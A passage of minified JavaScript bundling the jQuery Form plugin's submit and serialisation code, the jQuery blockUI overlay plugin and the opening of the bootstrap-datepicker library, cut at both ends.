i.indexOf("javascript") && W.globalEval(a)), a }; return f } if (!this.length) return N("ajaxSubmit: skipping submit process - no element selected"), this; var D, o, a, Z = this; "function" == typeof k ? k = { success: k } : "string" == typeof k || !1 === k && 0 < arguments.length ? (k = { url: k, data: t, dataType: e }, "function" == typeof n && (k.success = n)) : void 0 === k && (k = {}), D = k.method || k.type || this.attr2("method"), (a = (a = "string" == typeof (o = k.url || this.attr2("action")) ? W.trim(o) : "") || window.location.href || "") && (a = (a.match(/^([^#]+)/) || [])[1]), k = W.extend(!0, { url: a, success: W.ajaxSettings.success, type: D || W.ajaxSettings.type, iframeSrc: /^https/i.test(window.location.href || "") ? "javascript:false" : "about:blank" }, k); var s = {}; if (this.trigger("form-pre-serialize", [this, k, s]), s.veto) return N("ajaxSubmit: submit vetoed via form-pre-serialize trigger"), this; if (k.beforeSerialize && !1 === k.beforeSerialize(this, k)) return N("ajaxSubmit: submit aborted via beforeSerialize callback"), this; var r = k.traditional; void 0 === r && (r = W.ajaxSettings.traditional); var g, l, U = [], c = this.formToArray(k.semantic, U, k.filtering); if (k.data && (l = W.isFunction(k.data) ? k.data(c) : k.data, k.extraData = l, g = W.param(l, r)), k.beforeSubmit && !1 === k.beforeSubmit(c, this, k)) return N("ajaxSubmit: submit aborted via beforeSubmit callback"), this; if (this.trigger("form-submit-validate", [c, this, k, s]), s.veto) return N("ajaxSubmit: submit vetoed via form-submit-validate trigger"), this; var I = W.param(c, r); g && (I = I ? I + "&" + g : g), "GET" === k.type.toUpperCase() ? (k.url += (0 <= k.url.indexOf("?") ? "&" : "?") + I, k.data = null) : k.data = I; var u, h, d, C = []; k.resetForm && C.push(function () { Z.resetForm() }), k.clearForm && C.push(function () { Z.clearForm(k.includeHidden) }), !k.dataType && k.target ? (u = k.success || function () { }, C.push(function (t, e, n) { var i = arguments, o = k.replaceTarget ? "replaceWith" : "html"; W(k.target)[o](t).each(function () { u.apply(this, i) }) })) : k.success && (W.isArray(k.success) ? W.merge(C, k.success) : C.push(k.success)), k.success = function (t, e, n) { for (var i = k.context || this, o = 0, a = C.length; o < a; o++)C[o].apply(i, [t, e, n || Z, Z]) }, k.error && (h = k.error, k.error = function (t, e, n) { var i = k.context || this; h.apply(i, [t, e, n, Z]) }), k.complete && (d = k.complete, k.complete = function (t, e) { var n = k.context || this; d.apply(n, [t, e, Z]) }); var A = 0 < W("input[type=file]:enabled", this).filter(function () { return "" !== W(this).val() }).length, p = "multipart/form-data", m = Z.attr("enctype") === p || Z.attr("encoding") === p, f = v.fileapi && v.formdata; N("fileAPI :" + f); var b, B = (A || m) && !f; !1 !== k.iframe && (k.iframe || B) ? k.closeKeepAlive ? W.get(k.closeKeepAlive, function () { b = i(c) }) : b = i(c) : b = (A || m) && f ? function (t) { for (var n = new FormData, e = 0; e < t.length; e++)n.append(t[e].name, t[e].value); if (k.extraData) for (var i = function (t) { for (var e, n = W.param(t, k.traditional).split("&"), i = n.length, o = [], a = 0; a < i; a++)n[a] = n[a].replace(/\+/g, " "), e = n[a].split("="), o.push([decodeURIComponent(e[0]), decodeURIComponent(e[1])]); return o }(k.extraData), e = 0; e < i.length; e++)i[e] && n.append(i[e][0], i[e][1]); k.data = null; var o = W.extend(!0, {}, W.ajaxSettings, k, { contentType: !1, processData: !1, cache: !1, type: D || "POST" }); k.uploadProgress && (o.xhr = function () { var t = W.ajaxSettings.xhr(); return t.upload && t.upload.addEventListener("progress", function (t) { var e = 0, n = t.loaded || t.position, i = t.total; t.lengthComputable && (e = Math.ceil(n / i * 100)), k.uploadProgress(t, n, i, e) }, !1), t }), o.data = null; var a = o.beforeSend; return o.beforeSend = function (t, e) { k.formData ? e.data = k.formData : e.data = n, a && a.call(this, t, e) }, W.ajax(o) }(c) : W.ajax(k), Z.removeData("jqxhr").data("jqxhr", b); for (var y = 0; y < U.length; y++)U[y] = null; return this.trigger("form-submit-notify", [this, k]), this }, W.fn.ajaxForm = function (t, e, n, i) { if (("string" == typeof t || !1 === t && 0 < arguments.length) && (t = { url: t, data: e, dataType: n }, "function" == typeof i && (t.success = i)), (t = t || {}).delegation = t.delegation && W.isFunction(W.fn.on), t.delegation || 0 !== this.length) return t.delegation ? (W(document).off("submit.form-plugin", this.selector, a).off("click.form-plugin", this.selector, s).on("submit.form-plugin", this.selector, t, a).on("click.form-plugin", this.selector, t, s), this) : this.ajaxFormUnbind().on("submit.form-plugin", t, a).on("click.form-plugin", t, s); var o = { s: this.selector, c: this.context }; return !W.isReady && o.s ? (N("DOM not ready, queuing ajaxForm"), W(function () { W(o.s, o.c).ajaxForm(t) })) : N("terminating; zero elements found by selector" + (W.isReady ? "" : " (DOM not ready)")), this }, W.fn.ajaxFormUnbind = function () { return this.off("submit.form-plugin click.form-plugin") }, W.fn.formToArray = function (t, e, n) { var i = []; if (0 === this.length) return i; var o, a, s, r, g, l, c, I, u, h, d = this[0], C = this.attr("id"), A = (A = t || void 0 === d.elements ? d.getElementsByTagName("*") : d.elements) && W.makeArray(A); if (C && (t || /(Edge|Trident)\//.test(navigator.userAgent)) && (o = W(':input[form="' + C + '"]').get()).length && (A = (A || []).concat(o)), !A || !A.length) return i; for (W.isFunction(n) && (A = W.map(A, n)), a = 0, c = A.length; a < c; a++)if ((r = (l = A[a]).name) && !l.disabled) if (t && d.clk && "image" === l.type) d.clk === l && (i.push({ name: r, value: W(l).val(), type: l.type }), i.push({ name: r + ".x", value: d.clk_x }, { name: r + ".y", value: d.clk_y })); else if ((g = W.fieldValue(l, !0)) && g.constructor === Array) for (e && e.push(l), s = 0, I = g.length; s < I; s++)i.push({ name: r, value: g[s] }); else if (v.fileapi && "file" === l.type) { e && e.push(l); var p = l.files; if (p.length) for (s = 0; s < p.length; s++)i.push({ name: r, value: p[s], type: l.type }); else i.push({ name: r, value: "", type: l.type }) } else null != g && (e && e.push(l), i.push({ name: r, value: g, type: l.type, required: l.required })); return t || !d.clk || (r = (h = (u = W(d.clk))[0]).name) && !h.disabled && "image" === h.type && (i.push({ name: r, value: u.val() }), i.push({ name: r + ".x", value: d.clk_x }, { name: r + ".y", value: d.clk_y })), i }, W.fn.formSerialize = function (t) { return W.param(this.formToArray(t)) }, W.fn.fieldSerialize = function (o) { var a = []; return this.each(function () { var t = this.name; if (t) { var e = W.fieldValue(this, o); if (e && e.constructor === Array) for (var n = 0, i = e.length; n < i; n++)a.push({ name: t, value: e[n] }); else null != e && a.push({ name: this.name, value: e }) } }), W.param(a) }, W.fn.fieldValue = function (t) { for (var e = [], n = 0, i = this.length; n < i; n++) { var o = this[n], a = W.fieldValue(o, t); null == a || a.constructor === Array && !a.length || (a.constructor === Array ? W.merge(e, a) : e.push(a)) } return e }, W.fieldValue = function (t, e) { var n = t.name, i = t.type, o = t.tagName.toLowerCase(); if (void 0 === e && (e = !0), e && (!n || t.disabled || "reset" === i || "button" === i || ("checkbox" === i || "radio" === i) && !t.checked || ("submit" === i || "image" === i) && t.form && t.form.clk !== t || "select" === o && -1 === t.selectedIndex)) return null; if ("select" !== o) return W(t).val().replace(h, "\r\n"); var a = t.selectedIndex; if (a < 0) return null; for (var s = [], r = t.options, g = "select-one" === i, l = g ? a + 1 : r.length, c = g ? a : 0; c < l; c++) { var I = r[c]; if (I.selected && !I.disabled) { var u = (u = I.value) || (I.attributes && I.attributes.value && !I.attributes.value.specified ? I.text : I.value); if (g) return u; s.push(u) } } return s }, W.fn.clearForm = function (t) { return this.each(function () { W("input,select,textarea", this).clearFields(t) }) }, W.fn.clearFields = W.fn.clearInputs = function (n) { var i = /^(?:color|date|datetime|email|month|number|password|range|search|tel|text|time|url|week)$/i; return this.each(function () { var t = this.type, e = this.tagName.toLowerCase(); i.test(t) || "textarea" === e ? this.value = "" : "checkbox" === t || "radio" === t ? this.checked = !1 : "select" === e ? this.selectedIndex = -1 : "file" === t ? /MSIE/.test(navigator.userAgent) ? W(this).replaceWith(W(this).clone(!0)) : W(this).val("") : n && (!0 === n && /hidden/.test(t) || "string" == typeof n && W(this).is(n)) && (this.value = "") }) }, W.fn.resetForm = function () { return this.each(function () { var e = W(this), t = this.tagName.toLowerCase(); switch (t) { case "input": this.checked = this.defaultChecked; case "textarea": return this.value = this.defaultValue, !0; case "option": case "optgroup": var n = e.parents("select"); return n.length && n[0].multiple ? "option" === t ? this.selected = this.defaultSelected : e.find("option").resetForm() : n.resetForm(), !0; case "select": return e.find("option").each(function (t) { if (this.selected = this.defaultSelected, this.defaultSelected && !e[0].multiple) return e[0].selectedIndex = t, !1 }), !0; case "label": var i = W(e.attr("for")), o = e.find("input,select,textarea"); return i[0] && o.unshift(i[0]), o.resetForm(), !0; case "form": return "function" != typeof this.reset && ("object" != typeof this.reset || this.reset.nodeType) || this.reset(), !0; default: return e.find("form,input,label,select,textarea").resetForm(), !0 } }) }, W.fn.enable = function (t) { return void 0 === t && (t = !0), this.each(function () { this.disabled = !t }) }, W.fn.selected = function (n) { return void 0 === n && (n = !0), this.each(function () { var t, e = this.type; "checkbox" === e || "radio" === e ? this.checked = n : "option" === this.tagName.toLowerCase() && (t = W(this).parent("select"), n && t[0] && "select-one" === t[0].type && t.find("option").selected(!1), this.selected = n) }) }, W.fn.ajaxSubmit.debug = !1 }), function () { "use strict"; function t(x) { x.fn._fadeIn = x.fn.fadeIn; var F = x.noop || function () { }, Q = /MSIE/.test(navigator.userAgent), G = /MSIE 6.0/.test(navigator.userAgent) && !/MSIE 8.0/.test(navigator.userAgent), w = (document.documentMode, x.isFunction(document.createElement("div").style.setExpression)); x.blockUI = function (t) { n(window, t) }, x.unblockUI = function (t) { k(window, t) }, x.growlUI = function (t, e, n, i) { var o = x('<div class="growlUI"></div>'); t && o.append("<h1>" + t + "</h1>"), e && o.append("<h2>" + e + "</h2>"), void 0 === n && (n = 3e3); function a(t) { t = t || {}, x.blockUI({ message: o, fadeIn: void 0 !== t.fadeIn ? t.fadeIn : 700, fadeOut: void 0 !== t.fadeOut ? t.fadeOut : 1e3, timeout: void 0 !== t.timeout ? t.timeout : n, centerY: !1, showOverlay: !1, onUnblock: i, css: x.blockUI.defaults.growlCSS }) } a(); o.css("opacity"); o.mouseover(function () { a({ fadeIn: 0, timeout: 3e4 }); var t = x(".blockMsg"); t.stop(), t.fadeTo(300, 1) }).mouseout(function () { x(".blockMsg").fadeOut(1e3) }) }, x.fn.block = function (t) { if (this[0] === window) return x.blockUI(t), this; var e = x.extend({}, x.blockUI.defaults, t || {}); return this.each(function () { var t = x(this); e.ignoreIfBlocked && t.data("blockUI.isBlocked") || t.unblock({ fadeOut: 0 }) }), this.each(function () { "static" == x.css(this, "position") && (this.style.position = "relative", x(this).data("blockUI.static", !0)), this.style.zoom = 1, n(this, t) }) }, x.fn.unblock = function (t) { return this[0] === window ? (x.unblockUI(t), this) : this.each(function () { k(this, t) }) }, x.blockUI.version = 2.7, x.blockUI.defaults = { message: "<h1>Please wait...</h1>", title: null, draggable: !0, theme: !1, css: { padding: 0, margin: 0, width: "30%", top: "40%", left: "35%", textAlign: "center", color: "#000", border: "3px solid #aaa", backgroundColor: "#fff", cursor: "wait" }, themedCSS: { width: "30%", top: "40%", left: "35%" }, overlayCSS: { backgroundColor: "#000", opacity: .6, cursor: "wait" }, cursorReset: "default", growlCSS: { width: "350px", top: "10px", left: "", right: "10px", border: "none", padding: "5px", opacity: .6, cursor: "default", color: "#fff", backgroundColor: "#000", "-webkit-border-radius": "10px", "-moz-border-radius": "10px", "border-radius": "10px" }, iframeSrc: /^https/i.test(window.location.href || "") ? "javascript:false" : "about:blank", forceIframe: !1, baseZ: 1e3, centerX: !0, centerY: !0, allowBodyStretch: !0, bindEvents: !0, constrainTabKey: !0, fadeIn: 200, fadeOut: 400, timeout: 0, showOverlay: !0, focusInput: !0, focusableElements: ":input:enabled:visible", onBlock: null, onUnblock: null, onOverlayClick: null, quirksmodeOffsetHack: 4, blockMsgClass: "blockMsg", ignoreIfBlocked: !1 }; var X = null, S = []; function n(t, o) { var e, n, i, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B, y = t == window, v = o && void 0 !== o.message ? o.message : void 0; (o = x.extend({}, x.blockUI.defaults, o || {})).ignoreIfBlocked && x(t).data("blockUI.isBlocked") || (o.overlayCSS = x.extend({}, x.blockUI.defaults.overlayCSS, o.overlayCSS || {}), e = x.extend({}, x.blockUI.defaults.css, o.css || {}), o.onOverlayClick && (o.overlayCSS.cursor = "pointer"), n = x.extend({}, x.blockUI.defaults.themedCSS, o.themedCSS || {}), v = void 0 === v ? o.message : v, y && X && k(window, { fadeOut: 0 }), v && "string" != typeof v && (v.parentNode || v.jquery) && (i = v.jquery ? v[0] : v, a = {}, x(t).data("blockUI.history", a), a.el = i, a.parent = i.parentNode, a.display = i.style.display, a.position = i.style.position, a.parent && a.parent.removeChild(i)), x(t).data("blockUI.onUnblock", o.onUnblock), s = o.baseZ, l = Q || o.forceIframe ? x('<iframe class="blockUI" style="z-index:' + s++ + ';display:none;border:none;margin:0;padding:0;position:absolute;width:100%;height:100%;top:0;left:0" src="' + o.iframeSrc + '"></iframe>') : x('<div class="blockUI" style="display:none"></div>'), c = o.theme ? x('<div class="blockUI blockOverlay ui-widget-overlay" style="z-index:' + s++ + ';display:none"></div>') : x('<div class="blockUI blockOverlay" style="z-index:' + s++ + ';display:none;border:none;margin:0;padding:0;width:100%;height:100%;top:0;left:0"></div>'), o.theme && y ? (g = '<div class="blockUI ' + o.blockMsgClass + ' blockPage ui-dialog ui-widget ui-corner-all" style="z-index:' + (s + 10) + ';display:none;position:fixed">', o.title && (g += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">' + (o.title || "&nbsp;") + "</div>"), g += '<div class="ui-widget-content ui-dialog-content"></div>', g += "</div>") : o.theme ? (g = '<div class="blockUI ' + o.blockMsgClass + ' blockElement ui-dialog ui-widget ui-corner-all" style="z-index:' + (s + 10) + ';display:none;position:absolute">', o.title && (g += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">' + (o.title || "&nbsp;") + "</div>"), g += '<div class="ui-widget-content ui-dialog-content"></div>', g += "</div>") : g = y ? '<div class="blockUI ' + o.blockMsgClass + ' blockPage" style="z-index:' + (s + 10) + ';display:none;position:fixed"></div>' : '<div class="blockUI ' + o.blockMsgClass + ' blockElement" style="z-index:' + (s + 10) + ';display:none;position:absolute"></div>', r = x(g), v && (o.theme ? (r.css(n), r.addClass("ui-widget-content")) : r.css(e)), o.theme || c.css(o.overlayCSS), c.css("position", y ? "fixed" : "absolute"), (Q || o.forceIframe) && l.css("opacity", 0), I = [l, c, r], u = x(y ? "body" : t), x.each(I, function () { this.appendTo(u) }), o.theme && o.draggable && x.fn.draggable && r.draggable({ handle: ".ui-dialog-titlebar", cancel: "li" }), h = w && (!x.support.boxModel || 0 < x("object,embed", y ? null : t).length), (G || h) && (y && o.allowBodyStretch && x.support.boxModel && x("html,body").css("height", "100%"), !G && x.support.boxModel || y || (d = U(t, "borderTopWidth"), C = U(t, "borderLeftWidth"), A = d ? "(0 - " + d + ")" : 0, p = C ? "(0 - " + C + ")" : 0), x.each(I, function (t, e) { var n, i = e[0].style; i.position = "absolute", t < 2 ? (y ? i.setExpression("height", "Math.max(document.body.scrollHeight, document.body.offsetHeight) - (jQuery.support.boxModel?0:" + o.quirksmodeOffsetHack + ') + "px"') : i.setExpression("height", 'this.parentNode.offsetHeight + "px"'), y ? i.setExpression("width", 'jQuery.support.boxModel && document.documentElement.clientWidth || document.body.clientWidth + "px"') : i.setExpression("width", 'this.parentNode.offsetWidth + "px"'), p && i.setExpression("left", p), A && i.setExpression("top", A)) : o.centerY ? (y && i.setExpression("top", '(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight / 2) + (blah = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"'), i.marginTop = 0) : !o.centerY && y && (n = "((document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + " + (o.css && o.css.top ? parseInt(o.css.top, 10) : 0) + ') + "px"', i.setExpression("top", n)) })), v && (o.theme ? r.find(".ui-widget-content").append(v) : r.append(v), (v.jquery || v.nodeType) && x(v).show()), (Q || o.forceIframe) && o.showOverlay && l.show(), o.fadeIn ? (m = o.onBlock ? o.onBlock : F, f = o.showOverlay && !v ? m : F, b = v ? m : F, o.showOverlay && c._fadeIn(o.fadeIn, f), v && r._fadeIn(o.fadeIn, b)) : (o.showOverlay && c.show(), v && r.show(), o.onBlock && o.onBlock.bind(r)()), D(1, t, o), y ? (X = r[0], S = x(o.focusableElements, X), o.focusInput && setTimeout(Z, 20)) : function (t, e, n) { var i = t.parentNode, o = t.style, a = (i.offsetWidth - t.offsetWidth) / 2 - U(i, "borderLeftWidth"), s = (i.offsetHeight - t.offsetHeight) / 2 - U(i, "borderTopWidth"); e && (o.left = 0 < a ? a + "px" : "0"); n && (o.top = 0 < s ? s + "px" : "0") }(r[0], o.centerX, o.centerY), o.timeout && (B = setTimeout(function () { y ? x.unblockUI(o) : x(t).unblock(o) }, o.timeout), x(t).data("blockUI.timeout", B))) } function k(t, e) { var n, i, o = t == window, a = x(t), s = a.data("blockUI.history"), r = a.data("blockUI.timeout"); r && (clearTimeout(r), a.removeData("blockUI.timeout")), e = x.extend({}, x.blockUI.defaults, e || {}), D(0, t, e), null === e.onUnblock && (e.onUnblock = a.data("blockUI.onUnblock"), a.removeData("blockUI.onUnblock")), i = o ? x("body").children().filter(".blockUI").add("body > .blockUI") : a.find(">.blockUI"), e.cursorReset && (1 < i.length && (i[1].style.cursor = e.cursorReset), 2 < i.length && (i[2].style.cursor = e.cursorReset)), o && (X = S = null), e.fadeOut ? (n = i.length, i.stop().fadeOut(e.fadeOut, function () { 0 == --n && g(i, s, e, t) })) : g(i, s, e, t) } function g(t, e, n, i) { var o, a, s, r = x(i); r.data("blockUI.isBlocked") || (t.each(function (t, e) { this.parentNode && this.parentNode.removeChild(this) }), e && e.el && (e.el.style.display = e.display, e.el.style.position = e.position, e.el.style.cursor = "default", e.parent && e.parent.appendChild(e.el), r.removeData("blockUI.history")), r.data("blockUI.static") && r.css("position", "static"), "function" == typeof n.onUnblock && n.onUnblock(i, n), a = (o = x(document.body)).width(), s = o[0].style.width, o.width(a - 1).width(a), o[0].style.width = s) } function D(t, e, n) { var i, o = e == window, a = x(e); !t && (o && !X || !o && !a.data("blockUI.isBlocked")) || (a.data("blockUI.isBlocked", t), o && n.bindEvents && (!t || n.showOverlay) && (i = "mousedown mouseup keydown keypress keyup touchstart touchend touchmove", t ? x(document).bind(i, n, s) : x(document).unbind(i, s))) } function s(t) { if ("keydown" === t.type && t.keyCode && 9 == t.keyCode && X && t.data.constrainTabKey) { var e = !t.shiftKey && t.target === S[S.length - 1], n = t.shiftKey && t.target === S[0]; if (e || n) return setTimeout(function () { Z(n) }, 10), !1 } var i = t.data, o = x(t.target); return o.hasClass("blockOverlay") && i.onOverlayClick && i.onOverlayClick(t), 0 < o.parents("div." + i.blockMsgClass).length || 0 === o.parents().children().filter("div.blockUI").length } function Z(t) { var e; !S || (e = S[!0 === t ? S.length - 1 : 0]) && e.focus() } function U(t, e) { return parseInt(x.css(t, e), 10) || 0 } } "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? t(require("jquery")) : t(jQuery) }(), function (t) { "function" == typeof define && define.amd ? define(["jquery"], t) : t("object" == typeof exports ? require("jquery") : jQuery) }(function (w, X) { function S() { return new Date(Date.UTC.apply(Date, arguments)) } function k() { var t = new Date; return S(t.getFullYear(), t.getMonth(), t.getDate()) } function a(t, e) { return t.getUTCFullYear() === e.getUTCFullYear() && t.getUTCMonth() === e.getUTCMonth() && t.getUTCDate() === e.getUTCDate() } function t(t, e) { return function () { return e !== X && w.fn.datepicker.deprecated(e), this[t].apply(this, arguments) } } function B(t, e) { w.data(t, "datepicker", this), this._events = [], this._secondaryEvents = [], this._process_options(e), this.dates = new n, this.viewDate = this.o.defaultViewDate, this.focusDate = null, this.element = w(t), this.isInput = this.element.is("input"), this.inputField = this.isInput ? this.element : this.element.find("input"), this.component = !!this.element.hasClass("date") && this.element.find(".add-on, .input-group-addon, .input-group-append, .input-group-prepend, .btn"), this.component && 0 === this.component.length && (this.component = !1), this.isInline = !this.component && this.element.is("div"), this.picker = w(Z.template), this._check_template(this.o.templates.leftArrow) && this.picker.find(".prev").html(this.o.templates.leftArrow), this._check_template(this.o.templates.rightArrow) && this.picker.find(".next").html(this.o.templates.rightArrow), this._buildEvents(), this._attachEvents(), this.isInline ? this.picker.addClass("datepicker-inline").appendTo(this.element) : this.picker.addClass("datepicker-dropdown dropdown-menu"), this.o.rtl && this.picker.addClass("datepicker-rtl"), this.o.calendarWeeks && this.picker.find(".datepicker-days .datepicker-switch, thead .datepicker-title, tfoot .today, tfoot .clear").attr("colspan", function (t, e) { return Number(e) + 1 }), this._process_options({ startDate: this._o.startDate, endDate: this._o.endDate, daysOfWeekDisabled: this.o.daysOfWeekDisabled, daysOfWeekHighlighted: this.o.daysOfWeekHighlighted, datesDisabled: this.o.datesDisabled }), this._allow_update = !1, this.setViewMode(this.o.startView), this._allow_update = !0, this.fillDow(), this.fillMonths(), this.update(), this.isInline && this.show() } var e, n = (e = { get: function (t) { return this.slice(t)[0] }, contains: function (t) { for (var e = t && t.valueOf(), n = 0, i = this.length; n < i; n++)if (0 <= this[n].valueOf() - e && this[n].valueOf() - e < 864e5) return n; return -1 }, remove: function (t) { this.splice(t, 1) }, replace: function (t) { t && (w.isArray(t) || (t = [t]), this.clear(), this.push.apply(this, t)) }, clear: function () { this.length = 0 }, copy: function () { var t = new n; return t.replace(this), t } }, function () { var t = []; return t.push.apply(t, arguments), w.extend(t, e), t }); B.prototype = { constructor: B, _resolveViewName: function (n) { return w.each(Z.viewModes, function (t, e) { if (n === t || -1 !== w.inArray(n, e.names)) return n = t, !1 }), n }, _resolveDaysOfWeek: function (t) { return w.isArray(t) || (t = t.split(/[,\s]*/)), w.map(t, Number) }, _check_template: function (t) { try { return t === X || "" === t ? !1 : (t.match(/[<>]/g) || []).length <= 0 || 0 < w(t).length } catch (t) { return !1 } }, _process_options: function (t) { this._o = w.extend({}, this._o, t); var e = this.o = w.extend({}, this._o), n = e.language; D[n] || (n = n.split("-")[0], D[n] || (n = c.language)), e.language = n, e.startView = this._resolveViewName(e.startView), e.minViewMode = this._resolveViewName(e.minViewMode), e.maxViewMode = this._resolveViewName(e.maxViewMode), e.startView = Math.max(this.o.minViewMode, Math.min(this.o.maxViewMode, e.startView)), !0 !== e.multidate && (e.multidate = Number(e.multidate) || !1, !1 !== e.multidate && (e.multidate = Math.max(0, e.multidate))), e.multidateSeparator = String(e.multidateSeparator), e.weekStart %= 7, e.weekEnd = (e.weekStart + 6) % 7; var i = Z.parseFormat(e.format); e.startDate !== -1 / 0 && (e.startDate ? e.startDate instanceof Date ? e.startDate = this._local_to_utc(this._zero_time(e.startDate)) : e.startDate = Z.parseDate(e.startDate, i, e.language, e.assumeNearbyYear) : e.startDate = -1 / 0), e.endDate !== 1 / 0 && (e.endDate ? e.endDate instanceof Date ? e.endDate = this._local_to_utc(this._zero_time(e.endDate)) : e.endDate = Z.parseDate(e.endDate, i, e.language, e.assumeNearbyYear) : e.endDate = 1 / 0), e.daysOfWeekDisabled = this._resolveDaysOfWeek(e.daysOfWeekDisabled || []), e.daysOfWeekHighlighted = this._resolveDaysOfWeek(e.daysOfWeekHighlighted || []), e.datesDisabled = e.datesDisabled || [], w.isArray(e.datesDisabled) || (e.datesDisabled = e.datesDisabled.split(",")), e.datesDisabled = w.map(e.datesDisabled, function (t) { return Z.parseDate(t, i, e.language, e.assumeNearbyYear) }); var o, a, s, r = String(e.orientation).toLowerCase().split(/\s+/g), g = e.orientation.toLowerCase(), r = w.grep(r, function (t) { return /^auto|left|right|top|bottom$/.test(t) }); if (e.orientation = { x: "auto", y: "auto" }, g && "auto" !== g) if (1 === r.length) switch (r[0]) { case "top": case "bottom": e.orientation.y = r[0]; break; case "left": case "right": e.orientation.x = r[0] } else g = w.grep(r, function (t) { return /^left|right$/.test(t) }), e.orientation.x = g[0] || "auto", g = w.grep(r, function (t) { return /^top|bottom$/.test(t) }), e.orientation.y = g[0] || "auto"; e.defaultViewDate instanceof Date || "string" == typeof e.defaultViewDate ? e.defaultViewDate = Z.parseDate(e.defaultViewDate, i, e.language, e.assumeNearbyYear) : e.defaultViewDate ? (o = e.defaultViewDate.year || (new Date).getFullYear(), a = e.defaultViewDate.month || 0, s = e.defaultViewDate.day || 1, e.defaultViewDate = S(o, a, s)) : e.defaultViewDate = k() }, _applyEvents: function (t) { for (var e, n, i, o = 0; o < t.length; o++)e = t[o][0], 2 === t[o].length ? (n = X, i = t[o][1]) : 3 === t[o].length && (n = t[o][1], i = t[o][2]), e.on(i, n) }, _unapplyEvents: function (t) { for (var e, n, i, o = 0; o < t.length; o++)e = t[o][0], 2 === t[o].length ? (i = X, n = t[o][1]) : 3 === t[o].length && (i = t[o][1], n = t[o][2]), e.off(n, i) }, _buildEvents: function () { var t = { keyup: w.proxy(function (t) { -1 === w.inArray(t.keyCode, [27, 37, 39, 38, 40, 32, 13, 9]) && this.update() }, this), keydown: w.proxy(this.keydown, this), paste: w.proxy(this.paste, this) }; !0 === this.o.showOnFocus && (t.focus = w.proxy(this.show, this)), this.isInput ? this._events = [[this.element, t]] : this.component && this.inputField.length ? this._events = [[this.inputField, t], [this.component, { click: w.proxy(this.show, this) }]] : this._events = [[this.element, { click: w.proxy(this.show, this), keydown: w.proxy(this.keydown, this) }]], this._events.push([this.element, "*", { blur: w.proxy(function (t) { this._focused_from = t.target }, this) }], [this.element, { blur: w.proxy(function (t) { this._focused_from = t.target }, this) }]), this.o.immediateUpdates && this._events.push([this.element, { "changeYear changeMonth": w.proxy(function (t) { this.update(t.date) }, this) }]), this._secondaryEvents = [[this.picker, { click: w.proxy(this.click, this) }], [this.picker, ".prev, .next", { click: w.proxy(this.navArrowsClick, this) }], [this.picker, ".day:not(.disabled)", { click: w.proxy(this.dayCellClick, this) }], [w(window), { resize: w.proxy(this.place, this) }], [w(document), { "mousedown touchstart": w.proxy(function (t) { this.element.is(t.target) || this.element.find(t.target).length || this.picker.is(t.target) || this.picker.find(t.target).length || this.isInline || this.hide() }, this) }]] }, _attachEvents: function () { this._detachEvents(), this._applyEvents(this._events) }, _detachEvents: function () { this._unapplyEvents(this._events) }, _attachSecondaryEvents: function () { this._detachSecondaryEvents(), this._applyEvents(this._secondaryEvents) }, _detachSecondaryEvents: function () { this._unapplyEvents(this._secondaryEvents) }, _trigger: function (t, e) { var n = e || this.dates.get(-1), i = this._utc_to_local(n); this.element.trigger({ type: t, date: i, viewMode: this.viewMode, dates: w.map(this.dates, this._utc_to_local), format: w.proxy(function (t, e) { 0 === arguments.length ? (t = this.dates.length - 1, e = this.o.format) : "string" == typeof t && (e = t, t = this.dates.length - 1), e = e || this.o.format; var n = this.dates.get(t); return Z.formatDate(n, e, this.o.language) }, this) }) }, show: function () { if (!(this.inputField.is(":disabled") || this.inputField.prop("readonly") && !1 === this.o.enableOnReadonly)) return this.isInline || this.picker.appendTo(this.o.container), this.place(), this.picker.show(), this._attachSecondaryEvents(), this._trigger("show"), (window.navigator.msMaxTouchPoints || "ontouchstart" in document) && this.o.disableTouchKeyboard && w(this.element).blur(), this }, hide: function () { return this.isInline || !this.picker.is(":visible") || (this.focusDate = null, this.picker.hide().detach(), this._detachSecondaryEvents(), this.setViewMode(this.o.startView), this.o.forceParse && this.inputField.val() && this.setValue(), this._trigger("hide")), this }, destroy: function () { return this.hide(), this._detachEvents(), this._detachSecondaryEvents(), this.picker.remove(), delete this.element.data().datepicker, this.isInput || delete this.element.data().date, this }, paste: function (t) { var e; if (t.originalEvent.clipboardData && t.originalEvent.clipboardData.types && -1 !== w.inArray("text/plain", t.originalEvent.clipboardData.types)) e = t.originalEvent.clipboardData.getData("text/plain"); else { if (!window.clipboardData) return; e = window.clipboardData.getData("Text") } this.setDate(e), this.update(), t.preventDefault() }, _utc_to_local: function (t) { if (!t) return t; var e = new Date(t.getTime() + 6e4 * t.getTimezoneOffset()); return e.getTimezoneOffset() !== t.getTimezoneOffset() && (e = new Date(t.getTime() + 6e4 * e.getTimezoneOffset())), e }, _local_to_utc: function (t) { return t && new Date(t.getTime() - 6e4 * t.getTimezoneOffset()) }, _zero_time: function (t) { return t && new Date(t.getFullYear(), t.getMonth(), t.getDate()) }, _zero_utc_time: function (t) { return t && S(t.getUTCFullYear(), t.getUTCMonth(), t.getUTCDate()) }, getDates: function () { return w.map(this.dates, this._utc_to_local) }, getUTCDates: function () { return w.map(this.dates, function (t) { return new Date(t) }) }, getDate: function () { return this._utc_to_local(this.getUTCDate()) }, getUTCDate: function () { var t = this.dates.get(-1); return t !== X ? new Date(t) : null }, clearDates: function () { this.inputField.val(""), this.update(), this._trigger("changeDate"), this.o.autoclose && this.hide() }, setDates: function () { var t = w.isArray(arguments[0]) ? arguments[0] : arguments; return this.update.apply(this, t), this._trigger("changeDate"), this.setValue(), this }, setUTCDates: function () { var t = w.isArray(arguments[0]) ? arguments[0] : arguments; return this.setDates.apply(this, w.map(t, this._utc_to_local)), this }, setDate: t("setDates"), setUTCDate: t("setUTCDates"), remove: t("destroy", "Method `remove` is deprecated and will be removed in version 2.0. Use `destroy` instead"), setValue: function () { var t = this.getFormattedDate(); return this.inputField.val(t), this }, getFormattedDate: function (e) { e === X && (e = this.o.format); var n = this.o.language; return w.map(this.dates, function (t) { return Z.formatDate(t, e, n) }).join(this.o.multidateSeparator) }, getStartDate: function () { return this.o.startDate }, setStartDate: function (t) { return this._process_options({ startDate: t }), this.update(), this.updateNavArrows(), this }, getEndDate: function () { 